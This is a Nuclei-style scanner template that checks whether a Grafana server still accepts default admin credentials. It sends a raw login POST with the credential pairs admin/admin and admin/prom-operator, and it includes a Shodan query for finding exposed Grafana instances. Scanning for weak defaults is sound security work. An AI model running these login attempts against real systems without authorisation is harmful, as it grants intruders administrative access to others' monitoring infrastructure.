id: grafana-default-login
info:
  name: Grafana Default Login
  author: pdteam
  severity: high
  description: Grafana default admin login credentials were detected.
  reference:
    - https://grafana.com/docs/grafana/latest/administration/configuration/#disable_brute_force_login_protection
    - https://stackoverflow.com/questions/54039604/what-is-the-default-username-and-password-for-grafana-login-page
    - https://github.com/grafana/grafana/issues/14755
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:grafana:grafana:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Grafana"})
    max-request: 2
    product: grafana
    shodan-query: title:"Grafana"
    vendor: grafana
  tags: default-login,grafana,vuln
http:
  - attack: pitchfork
    matchers:
      - part: header
        type: word
        words:
          - grafana_session
      - part: body
        type: word
        words:
          - Logged in
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - prom-operator
        - admin
      username:
        - admin
        - admin
    raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Accept-Language: en-US,en;q=0.5
        Referer: {{BaseURL}}
        content-type: application/json

        {"user":"{{username}}","password":"{{password}}"}
